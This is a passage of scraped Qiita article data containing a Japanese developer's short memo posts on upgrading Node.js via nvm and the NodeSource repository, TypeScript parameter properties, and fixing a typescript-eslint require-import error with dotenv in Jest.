href=\"#3nodesource%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E3%82%92%E8%BF%BD%E5%8A%A0\"><i class=\"fa fa-link\"></i></a>3.NodeSourceリポジトリを追加</h3>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"47:1-49:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>curl <span class=\"nt\">-fsSL</span> https://deb.nodesource.com/setup_20.x | <span class=\"nb\">sudo</span> <span class=\"nt\">-E</span> bash -\n</code></pre></div></div>\n<p data-sourcepos=\"51:1-51:102\"><code>setup_20.x</code>はアップグレードしたいバージョンを指定（v22の場合、<code>setup_22.x</code>）</p>\n<h3 data-sourcepos=\"53:1-53:37\">\n<span id=\"4nodejsをアップグレード\" class=\"fragment\"></span><a href=\"#4nodejs%E3%82%92%E3%82%A2%E3%83%83%E3%83%97%E3%82%B0%E3%83%AC%E3%83%BC%E3%83%89\"><i class=\"fa fa-link\"></i></a>4.Node.jsをアップグレード</h3>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"54:1-56:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span><span class=\"nb\">sudo </span>apt-get <span class=\"nb\">install</span> <span class=\"nt\">-y</span> nodejs\n</code></pre></div></div>\n<h3 data-sourcepos=\"58:1-58:40\">\n<span id=\"5nodejsのバージョンを確認\" class=\"fragment\"></span><a href=\"#5nodejs%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>5.Node.jsのバージョンを確認</h3>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"59:1-61:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>node <span class=\"nt\">-v</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"63:1-63:78\">\n<span id=\"6変わっていない場合nvmコマンドでバージョンを変更\" class=\"fragment\"></span><a href=\"#6%E5%A4%89%E3%82%8F%E3%81%A3%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88nvm%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A7%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%92%E5%A4%89%E6%9B%B4\"><i class=\"fa fa-link\"></i></a>6.変わっていない場合、nvmコマンドでバージョンを変更</h3>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"64:1-69:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>nvm <span class=\"nb\">install </span>20\n<span class=\"nv\">$ </span>nvm use 20\n<span class=\"c\"># 再度バージョンを確認</span>\n<span class=\"nv\">$ </span>node <span class=\"nt\">-v</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"71:1-71:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"72:1-73:109\">今回のエラーは1か月前にfirebaseの設定を行い、再度を試みたところ遭遇したエラーになります。<br>\n1か月でバージョンアップを求められ、技術の移り変わりの速さを実感しました。</p>\n","body":"# はじめに\nFirebaseのインストールを試みたところ表題のエラーに遭遇しました。\n今後も、versionの変更時にスムーズに対応できるよう備忘録として残します。\n\n# 問題\nNode.jsのバージョンをv.20にアップグレードしたい。\n\n# 環境\nUbuntu 22.04.5 LTS\n\n# 解決方法\n以下の手順で解決しました。\n\n### 1.Node.jsの現在のバージョンを確認\n```shell\n$ node -v\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c50e8195-5fa6-4f99-8f80-07ffd1298a51.png)\n\n### 2.nvmコマンドのインストール\n\n* nvmコマンドがインストールされているか確認。コマンドがあればスキップ\n\n```shell\n$　nvm --version\n$ command -v nvm\n```\n\n* 結果が空の場合、使用しているシェルを確認\n設定ファイルを開き、コードを追加する\n\n```shell\n$ echo $SHELL\n~/.bashrc\n# 設定ファイルを開く\n$ nano ~/.bashrc\n# 設定ファイルの下のほうに以下の行があるか確認、ない場合は追加\nexport NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\" # This loads nvm\n[ -s \"$NVM_DIR/bash_completion\" ] && \\. \"$NVM_DIR/bash_completion\" # This loads nvm bash_completion\n# 設定ファイル再読み込み\n$ source ~/.bashrc\n```\n\n### 3.NodeSourceリポジトリを追加\n```shell\n$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -\n```\n\n`setup_20.x`はアップグレードしたいバージョンを指定（v22の場合、`setup_22.x`）\n\n### 4.Node.jsをアップグレード\n```shell\n$ sudo apt-get install -y nodejs\n```\n\n### 5.Node.jsのバージョンを確認\n```shell\n$ node -v\n```\n\n### 6.変わっていない場合、nvmコマンドでバージョンを変更\n```shell\n$ nvm install 20\n$ nvm use 20\n# 再度バージョンを確認\n$ node -v\n```\n\n# おわりに\n今回のエラーは1か月前にfirebaseの設定を行い、再度を試みたところ遭遇したエラーになります。\n1か月でバージョンアップを求められ、技術の移り変わりの速さを実感しました。\n","coediting":false,"comments_count":0,"created_at":"2025-04-03T21:26:44+09:00","group":null,"id":"3084b79e55cef0405954","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Node.js","versions":[]},{"name":"nvm","versions":[]},{"name":"アップグレード","versions":[]}],"title":"【Node.js】Please upgrade Node.js to version >=20.0.0 || >=22.0.0","updated_at":"2025-04-03T21:26:44+09:00","url":"https://qiita.com/asa129/items/3084b79e55cef0405954","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":877,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:223\">TypeScriptのクラス作成を学習していて、<code>Parameter Properties</code>という機能を知りました。従来のクラス定義方法と比較し、Parameter Propertiesの利点を備忘録としてまとめます。</p>\n<h1 data-sourcepos=\"4:1-4:40\">\n<span id=\"クラスclass定義作成方法\" class=\"fragment\"></span><a href=\"#%E3%82%AF%E3%83%A9%E3%82%B9class%E5%AE%9A%E7%BE%A9%E4%BD%9C%E6%88%90%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>クラス（class）定義作成方法</h1>\n<h3 data-sourcepos=\"5:1-5:79\">\n<span id=\"フィールド定義コンストラクタでフィールドを初期化\" class=\"fragment\"></span><a href=\"#%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E5%AE%9A%E7%BE%A9%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%81%A7%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E3%82%92%E5%88%9D%E6%9C%9F%E5%8C%96\"><i class=\"fa fa-link\"></i></a>フィールド定義＋コンストラクタでフィールドを初期化</h3>\n<p data-sourcepos=\"7:1-9:25\">クラス内で以下の定義を行います。<br>\n・ フィールド<br>\n・ コンストラクタ</p>\n<p data-sourcepos=\"11:1-11:150\">実際にクラスからオブジェクトを作成する場合（インスタンス化）、引数に値を設定することで作成可能です。</p>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"13:1-33:3\">\n<div class=\"code-lang\"><span class=\"bold\">todo.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">class</span> <span class=\"nc\">Todo</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// フィールド定義</span>\n  <span class=\"k\">public</span> <span class=\"nx\">id</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">done</span><span class=\"p\">:</span> <span class=\"nx\">boolean</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">created_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n\n  <span class=\"c1\">// コンストラクタ</span>\n  <span class=\"nf\">constructor</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">,</span>  <span class=\"nx\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span> <span class=\"nx\">done</span><span class=\"p\">:</span> <span class=\"nx\">boolean</span><span class=\"p\">,</span> <span class=\"nx\">created_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">id</span> <span class=\"o\">=</span> <span class=\"nx\">id</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">title</span> <span class=\"o\">=</span> <span class=\"nx\">title</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">done</span> <span class=\"o\">=</span> <span class=\"nx\">done</span><span class=\"p\">;</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">created_at</span> <span class=\"o\">=</span> <span class=\"nx\">created_at</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// インスタンス化</span>\n<span class=\"kd\">const</span> <span class=\"nx\">newTodo</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Todo</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">20250330</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">newTodoだよ</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"nx\">newTodo</span><span class=\"p\">);</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"35:1-35:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd69ec94f-e765-41ff-b4d1-3874d5ce0d67.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=eb41912697440c369a3713a6a32e858f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd69ec94f-e765-41ff-b4d1-3874d5ce0d67.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=eb41912697440c369a3713a6a32e858f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd69ec94f-e765-41ff-b4d1-3874d5ce0d67.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=bcf8602c8dc60cdf1fd47e338fc75989 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d69ec94f-e765-41ff-b4d1-3874d5ce0d67.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"37:1-39:30\">個人的に感じたフィールド定義でクラス定義した場合のメリット・デメリット<br>\nメリット：フィールドを最初に定義するので、どの値を定義したクラスかわかりやすい<br>\nデメリット：冗長する</p>\n<h3 data-sourcepos=\"41:1-41:39\">\n<span id=\"parameter-propertiesで定義する\" class=\"fragment\"></span><a href=\"#parameter-properties%E3%81%A7%E5%AE%9A%E7%BE%A9%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Parameter Propertiesで定義する</h3>\n<p data-sourcepos=\"43:1-44:86\">コンストラクタの引数に、アクセス修飾子をつけることで、フィールドを自動で定義してくれます。<br>\nTypeScriptの<code>Parameter Properties</code>という機能を使うことで冗長化しない</p>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"47:1-61:3\">\n<div class=\"code-lang\"><span class=\"bold\">todo.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"c1\">// クラスの作成</span>\n<span class=\"k\">export</span> <span class=\"kd\">class</span> <span class=\"nc\">Todo</span> <span class=\"p\">{</span>\n  <span class=\"nf\">constructor</span><span class=\"p\">(</span>\n    <span class=\"k\">public</span> <span class=\"nx\">id</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">done</span><span class=\"p\">:</span> <span class=\"nx\">boolean</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">created_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n  <span class=\"p\">){}</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// インスタンス化</span>\n<span class=\"kd\">const</span> <span class=\"nx\">newTodo</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Todo</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">20250330</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">newTodoだよ</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"nx\">newTodo</span><span class=\"p\">);</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"63:1-63:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"64:1-65:117\"><code>Parameter Properties</code>の定義方法は最初どういこと？となりました。<br>\n使い方を理解した後はこちらのほうが簡潔でわかりやすく記載できるなと感じました。</p>\n<h1 data-sourcepos=\"67:1-67:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"69:1-69:245\"><iframe id=\"qiita-embed-content__23bead2aba917d091b7d087c68b91288\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__23bead2aba917d091b7d087c68b91288\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Fobject-oriented%2Fclass%2Ffields%23%25E3%2582%25B3%25E3%2583%25B3%25E3%2582%25B9%25E3%2583%2588%25E3%2583%25A9%25E3%2582%25AF%25E3%2582%25BF%25E3%2582%2592%25E7%2594%25A8%25E3%2581%2584%25E3%2581%259F%25E3%2583%2595%25E3%2582%25A3%25E3%2583%25BC%25E3%2583%25AB%25E3%2583%2589%25E3%2581%25AE%25E5%2588%259D%25E6%259C%259F%25E5%258C%2596\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"71:1-71:80\"><iframe id=\"qiita-embed-content__a9338d11190d1b1fce7a875b89c1febb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a9338d11190d1b1fce7a875b89c1febb\" data-content=\"https%3A%2F%2Fwww.typescriptlang.org%2Fdocs%2Fhandbook%2F2%2Fclasses.html%23parameter-properties\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nTypeScriptのクラス作成を学習していて、`Parameter Properties`という機能を知りました。従来のクラス定義方法と比較し、Parameter Propertiesの利点を備忘録としてまとめます。\n\n# クラス（class）定義作成方法\n### フィールド定義＋コンストラクタでフィールドを初期化\n\nクラス内で以下の定義を行います。\n・ フィールド\n・ コンストラクタ\n\n実際にクラスからオブジェクトを作成する場合（インスタンス化）、引数に値を設定することで作成可能です。\n\n```typescript:todo.ts\nexport class Todo {\n  // フィールド定義\n  public id: number;\n  public title: string;\n  public done: boolean;\n  public created_at: string;\n\n  // コンストラクタ\n  constructor(id: number,  title: string, done: boolean, created_at: string) {\n    this.id = id;\n    this.title = title;\n    this.done = done;\n    this.created_at = created_at;\n  }\n}\n\n// インスタンス化\nconst newTodo = new Todo(1, \"title\", true, \"20250330\");\nconsole.log('newTodoだよ', newTodo);\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d69ec94f-e765-41ff-b4d1-3874d5ce0d67.png)\n\n個人的に感じたフィールド定義でクラス定義した場合のメリット・デメリット\nメリット：フィールドを最初に定義するので、どの値を定義したクラスかわかりやすい\nデメリット：冗長する\n\n### Parameter Propertiesで定義する\n\nコンストラクタの引数に、アクセス修飾子をつけることで、フィールドを自動で定義してくれます。\nTypeScriptの`Parameter Properties`という機能を使うことで冗長化しない\n\n\n```typescript:todo.ts\n// クラスの作成\nexport class Todo {\n  constructor(\n    public id: number,\n    public title: string,\n    public done: boolean,\n    public created_at: string,\n  ){}\n}\n\n// インスタンス化\nconst newTodo = new Todo(1, \"title\", true, \"20250330\");\nconsole.log('newTodoだよ', newTodo);\n```\n\n# おわりに\n`Parameter Properties`の定義方法は最初どういこと？となりました。\n使い方を理解した後はこちらのほうが簡潔でわかりやすく記載できるなと感じました。\n\n# 参考\n\nhttps://typescriptbook.jp/reference/object-oriented/class/fields#%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96\n\nhttps://www.typescriptlang.org/docs/handbook/2/classes.html#parameter-properties\n","coediting":false,"comments_count":0,"created_at":"2025-04-01T13:23:58+09:00","group":null,"id":"73ed8a667df7c5022573","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"class","versions":[]},{"name":"TypeScript","versions":[]}],"title":"【TypeScript】 Parameter Propertieを使ってclass作成を効率化する","updated_at":"2025-04-01T13:23:58+09:00","url":"https://qiita.com/asa129/items/73ed8a667df7c5022573","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":627,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:133\">Jestの環境構築中、手順通りに記載したところ掲題のエラーになったため、備忘録として残します。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<h4 data-sourcepos=\"5:1-5:67\">\n<span id=\"a-require-style-import-is-forbiddenエラーが発生する\" class=\"fragment\"></span><a href=\"#a-require-style-import-is-forbidden%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>A require() style import is forbidden.エラーが発生する</h4>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"8:1-12:3\">\n<div class=\"code-lang\"><span class=\"bold\">jest.setup.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/jest-dom</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">require</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">dotenv</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nf\">config</span><span class=\"p\">();</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"14:1-14:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff77e561e-5cb4-49c9-add9-1e4c0c2ad7db.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bda5557e397549b6177edb116fd81e0f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff77e561e-5cb4-49c9-add9-1e4c0c2ad7db.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bda5557e397549b6177edb116fd81e0f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff77e561e-5cb4-49c9-add9-1e4c0c2ad7db.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0718dd00c1ba57187bceb32efb7dfd52 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f77e561e-5cb4-49c9-add9-1e4c0c2ad7db.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"16:1-16:179\">本来は、<code>require(\"dotenv\").config();</code>を記述することで、プロジェクト直下に配置した.envファイルを読み込み、process.envに設定してくれる。</p>\n<p data-sourcepos=\"18:1-19:104\"><code>require(\"dotenv\")</code> : dotenvパッケージをimportする<br>\n<code>.config()</code> : .envファイル内に定義している環境変数を読み込み、process.envに設定</p>\n<h1 data-sourcepos=\"21:1-21:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h4 data-sourcepos=\"22:1-22:32\">\n<span id=\"import形式に修正した\" class=\"fragment\"></span><a href=\"#import%E5%BD%A2%E5%BC%8F%E3%81%AB%E4%BF%AE%E6%AD%A3%E3%81%97%E3%81%9F\"><i class=\"fa fa-link\"></i></a>import形式に修正した</h4>\n<p data-sourcepos=\"24:1-25:121\"><strong>TypeScriptを使用する場合、requireを使うよりもimportを使うことが推奨されている</strong><br>\nES-lintの<code>@typescript-eslint/no-require-imports</code>ルールに違反していたため、エラーが発生していた。</p>\n<div class=\"code-frame\" data-lang=\"diff_typescript\" data-sourcepos=\"28:1-34:3\">\n<div class=\"code-lang\"><span class=\"bold\">jest.setup.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/jest-dom</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">config</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">dotenv</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"hdl\"><span class=\"o\">- </span><span class=\"nf\">require</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">dotenv</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nf\">config</span><span class=\"p\">();</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"nf\">config</span><span class=\"p\">();</span>\n</span></code></pre></div>\n</div>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"37:1-37:87\">require()でもパッケージのインポートが可能なことを学びました。</p>\n<h1 data-sourcepos=\"39:1-39:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"41:1-41:54\"><iframe id=\"qiita-embed-content__b063cfc9bf5c7a588c8d1780a471624d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b063cfc9bf5c7a588c8d1780a471624d\" data-content=\"https%3A%2F%2Ftypescript-eslint.io%2Frules%2Fno-require-imports%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nJestの環境構築中、手順通りに記載したところ掲題のエラーになったため、備忘録として残します。\n\n# 問題\n#### A require() style import is forbidden.エラーが発生する\n\n\n```typescript:jest.setup.ts\nimport \"@testing-library/jest-dom\";\n\nrequire(\"dotenv\").config();\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f77e561e-5cb4-49c9-add9-1e4c0c2ad7db.png)\n\n本来は、`require(\"dotenv\").config();`を記述することで、プロジェクト直下に配置した.envファイルを読み込み、process.envに設定してくれる。\n\n`require(\"dotenv\")` : dotenvパッケージをimportする\n`.config()` : .envファイル内に定義している環境変数を読み込み、process.envに設定\n\n# 解決方法\n#### import形式に修正した\n\n**TypeScriptを使用する場合、requireを使うよりもimportを使うことが推奨されている**\nES-lintの`@typescript-eslint/no-require-imports`ルールに違反していたため、エラーが発生していた。\n\n\n```diff_typescript:jest.setup.ts\nimport \"@testing-library/jest-dom\";\n+ import { config } from \"dotenv\";\n\n- require(\"dotenv\").config();\n+ config();\n```\n\n# おわりに\nrequire()でもパッケージのインポートが可能なことを学びました。\n\n# 参考\n\nhttps://typescript-eslint.io/rules/no-require-imports/\n","coediting":false,"comments_count":0,"created_at":"2025-03-30T21:03:25+09:00","group":null,"id":"2b3489c4401088d71ea3","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"TypeScript","versions":[]},{"name":"Jest","versions":[]},{"name":"ESLint","versions":[]}],"title":"【typescript-eslint】A `require()` style import is forbidden.","updated_at":"2025-03-30T21:03:25+09:00","url":"https://qiita.com/asa129/items/2b3489c4401088d71ea3","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":1191,"team_membership":null,"organization_url_name":null,"slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:78\">環境変数ファイルを作成時につまったので記事にします。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-6:122\">正しいURL、キーを入力したはずなのに表題のエラーがでる<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F701af45b-9e10-4205-b770-204c4ff7a550.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d016b4e88fe263a5be98748c36327aa1\" target=\"_blank\" rel=\"nofollow noopener\"><img 